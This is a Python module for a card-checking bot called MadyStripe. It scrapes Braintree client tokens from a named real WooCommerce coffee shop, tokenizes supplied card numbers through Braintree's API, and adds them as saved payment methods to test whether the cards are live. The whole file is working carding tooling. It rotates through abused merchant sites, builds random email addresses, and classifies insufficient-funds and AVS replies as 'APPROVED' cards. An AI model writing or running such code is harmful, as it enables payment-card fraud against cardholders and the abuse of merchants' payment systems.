"""
Braintree Gateway for MadyStripe
Based on RavensBot implementation

This gateway uses WooCommerce sites with Braintree payment integration
to validate credit cards through the payment method addition flow.
"""

import aiohttp
import asyncio
import json
import base64
import re
import random
import string
from typing import Tuple, Optional, Dict, Any


class BraintreeGateway:
    """
    Braintree payment gateway using WooCommerce sites.
    
    Flow:
    1. Get Braintree client token from WooCommerce site
    2. Decode authorization fingerprint from JWT
    3. Tokenize card via Braintree GraphQL API
    4. Submit payment method to WooCommerce
    5. Parse response for approval/decline
    """
    
    # WooCommerce sites with Braintree integration
    SITES = [
        {
            'url': 'https://healthkickcoffee.com',
            'name': 'Health Kick Coffee',
            'active': True
        },
        # Add more sites as discovered
    ]
    
    # Braintree GraphQL endpoint
    BRAINTREE_GRAPHQL_URL = 'https://payments.braintree-api.com/graphql'
    
    # Response patterns for detection
    APPROVED_PATTERNS = [
        'Payment method successfully added',
        'street address',
        'Gateway Rejected: avs',
        'Insufficient Funds',
        'Do Not Honor',
        'Card Issuer Declined',
        'Processor Declined',
        'avs_postal_code_response_code',
    ]
    
    DECLINED_PATTERNS = [
        'Invalid card number',
        'Card number is invalid',
        'Expired card',
        'Invalid expiration',
        'Invalid CVV',
        'Card declined',
        'Transaction not allowed',
        'Lost card',
        'Stolen card',
        'Pick up card',
    ]
    
    def __init__(self):
        self.name = "Braintree Gateway"
        self.current_site_index = 0
        self.session = None
        
    def _get_next_site(self) -> Dict[str, Any]:
        """Get next active site for checking."""
        active_sites = [s for s in self.SITES if s.get('active', True)]
        if not active_sites:
            return self.SITES[0]
        
        site = active_sites[self.current_site_index % len(active_sites)]
        self.current_site_index += 1
        return site
    
    def _generate_random_email(self) -> str:
        """Generate random email for registration."""
        chars = string.ascii_lowercase + string.digits
        username = ''.join(random.choice(chars) for _ in range(10))
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        return f"{username}@{random.choice(domains)}"
    
    def _parse_card(self, card_string: str) -> Tuple[str, str, str, str]:
        """Parse card string into components."""
        parts = card_string.replace('/', '|').replace(':', '|').split('|')
        if len(parts) < 4:
            raise ValueError(f"Invalid card format: {card_string}")
        
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        # Normalize year
        if len(yy) == 2:
            yy = f"20{yy}"
        
        return cc, mm, yy, cvv
    
    def _detect_card_type(self, cc: str) -> str:
        """Detect card type from number."""
        if cc.startswith('4'):
            return 'VISA'
        elif cc.startswith(('51', '52', '53', '54', '55')) or \
             (2221 <= int(cc[:4]) <= 2720):
            return 'MASTERCARD'
        elif cc.startswith(('34', '37')):
            return 'AMEX'
        elif cc.startswith(('6011', '644', '645', '646', '647', '648', '649', '65')):
            return 'DISCOVER'
        else:
            return 'UNKNOWN'
    
    async def _get_client_token(self, session: aiohttp.ClientSession, site_url: str) -> Optional[str]:
        """Extract Braintree client token from WooCommerce site."""
        try:
            # Try to access the add payment method page
            url = f"{site_url}/my-account/add-payment-method/"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            
            async with session.get(url, headers=headers, timeout=30) as resp:
                if resp.status != 200:
                    return None
                
                html = await resp.text()
                
                # Look for Braintree client token
                patterns = [
                    r'wc_braintree_client_token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'clientToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'data-braintree-token=["\']([^"\']+)["\']',
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, html)
                    if match:
                        return match.group(1)
                
                return None
                
        except Exception as e:
            print(f"Error getting client token: {e}")
            return None
    
    def _decode_client_token(self, token: str) -> Optional[Dict[str, Any]]:
        """Decode Braintree client token (JWT)."""
        try:
            # Client token is base64 encoded JSON
            decoded = base64.b64decode(token)
            return json.loads(decoded)
        except Exception:
            try:
                # Try URL-safe base64
                decoded = base64.urlsafe_b64decode(token + '==')
                return json.loads(decoded)
            except Exception as e:
                print(f"Error decoding token: {e}")
                return None
    
    async def _tokenize_card(
        self, 
        session: aiohttp.ClientSession,
        auth_fingerprint: str,
        cc: str, 
        mm: str, 
        yy: str, 
        cvv: str
    ) -> Optional[str]:
        """Tokenize card via Braintree GraphQL API."""
        try:
            mutation = '''
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        binData {
                            prepaid
                            healthcare
                            debit
                            issuingBank
                            countryOfIssuance
                        }
                    }
                }
            }
            '''
            
            variables = {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv
                    },
                    'options': {
                        'validate': False
                    }
                }
            }
            
            headers = {
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {auth_fingerprint}',
                'Braintree-Version': '2018-05-10',
            }
            
            payload = {
                'query': mutation,
                'variables': variables
            }
            
            async with session.post(
                self.BRAINTREE_GRAPHQL_URL,
                json=payload,
                headers=headers,
                timeout=30
            ) as resp:
                if resp.status != 200:
                    return None
                
                data = await resp.json()
                
                if 'data' in data and 'tokenizeCreditCard' in data['data']:
                    return data['data']['tokenizeCreditCard'].get('token')
                
                return None
                
        except Exception as e:
            print(f"Error tokenizing card: {e}")
            return None
    
    async def _submit_payment_method(
        self,
        session: aiohttp.ClientSession,
        site_url: str,
        token: str,
        nonce: str
    ) -> Tuple[str, str]:
        """Submit payment method to WooCommerce."""
        try:
            url = f"{site_url}/my-account/add-payment-method/"
            
            # Get the page first to extract nonce
            async with session.get(url, timeout=30) as resp:
                html = await resp.text()
                
                # Extract WooCommerce nonce
                nonce_match = re.search(
                    r'woocommerce-add-payment-method-nonce["\']?\s*value=["\']([^"\']+)["\']',
                    html
                )
                wc_nonce = nonce_match.group(1) if nonce_match else ''
            
            # Submit the payment method
            data = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'visa',
                'wc-braintree-credit-card-payment-nonce': token,
                'woocommerce-add-payment-method-nonce': wc_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
            }
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            async with session.post(
                url,
                data=data,
                headers=headers,
                timeout=30,
                allow_redirects=True
            ) as resp:
                response_text = await resp.text()
                
                # Check for approved patterns
                for pattern in self.APPROVED_PATTERNS:
                    if pattern.lower() in response_text.lower():
                        return 'APPROVED', pattern
                
                # Check for declined patterns
                for pattern in self.DECLINED_PATTERNS:
                    if pattern.lower() in response_text.lower():
                        return 'DECLINED', pattern
                
                # Default to declined if no pattern matched
                return 'DECLINED', 'Unknown response'
                
        except Exception as e:
            return 'ERROR', str(e)
    
    async def check_async(self, card_string: str) -> Tuple[str, str, str]:
        """
        Check a card asynchronously.
        
        Returns:
            Tuple of (status, message, card_type)
            status: 'APPROVED', 'DECLINED', or 'ERROR'
        """
        try:
            # Parse card
            cc, mm, yy, cvv = self._parse_card(card_string)
            card_type = self._detect_card_type(cc)
            
            # Get site
            site = self._get_next_site()
            site_url = site['url']
            
            async with aiohttp.ClientSession() as session:
                # Step 1: Get client token
                client_token = await self._get_client_token(session, site_url)
                if not client_token:
                    return 'ERROR', 'Failed to get client token', card_type
                
                # Step 2: Decode token
                token_data = self._decode_client_token(client_token)
                if not token_data:
                    return 'ERROR', 'Failed to decode client token', card_type
                
                auth_fingerprint = token_data.get('authorizationFingerprint', '')
                if not auth_fingerprint:
                    return 'ERROR', 'No authorization fingerprint', card_type
                
                # Step 3: Tokenize card
                payment_token = await self._tokenize_card(
                    session, auth_fingerprint, cc, mm, yy, cvv
                )
                if not payment_token:
                    return 'DECLINED', 'Card tokenization failed', card_type
                
                # Step 4: Submit payment method
                status, message = await self._submit_payment_method(
                    session, site_url, payment_token, ''
                )
                
                return status, message, card_type
                
        except ValueError as e:
            return 'ERROR', str(e), 'UNKNOWN'
        except Exception as e:
            return 'ERROR', f'Gateway error: {str(e)}', 'UNKNOWN'
    
    def check(self, card_string: str) -> Tuple[str, str, str]:
        """
        Check a card synchronously.
        
        Returns:
            Tuple of (status, message, card_type)
        """
        return asyncio.run(self.check_async(card_string))


class BraintreeGatewayWrapper:
    """Wrapper for compatibility with GatewayManager."""
    
    def __init__(self):
        self.gateway = BraintreeGateway()
        self.name = "Braintree (WooCommerce)"
        self.id = 10
        self.description = "Braintree via WooCommerce payment method addition"
    
    def check(self, card_string: str) -> Tuple[str, str, str]:
        """Check a card."""
        return self.gateway.check(card_string)
    
    async def check_async(self, card_string: str) -> Tuple[str, str, str]:
        """Check a card asynchronously."""
        return await self.gateway.check_async(card_string)


# Singleton instance
_braintree_gateway = None

def get_braintree_gateway() -> BraintreeGatewayWrapper:
    """Get singleton Braintree gateway instance."""
    global _braintree_gateway
    if _braintree_gateway is None:
        _braintree_gateway = BraintreeGatewayWrapper()
    return _braintree_gateway


if __name__ == '__main__':
    # Test the gateway
    import sys
    
    gateway = BraintreeGateway()
    
    if len(sys.argv) > 1:
        card = sys.argv[1]
    else:
        card = '4242424242424242|12|25|123'
    
    print(f"Testing card: {card}")
    status, message, card_type = gateway.check(card)
    print(f"Status: {status}")
    print(f"Message: {message}")
    print(f"Card Type: {card_type}")
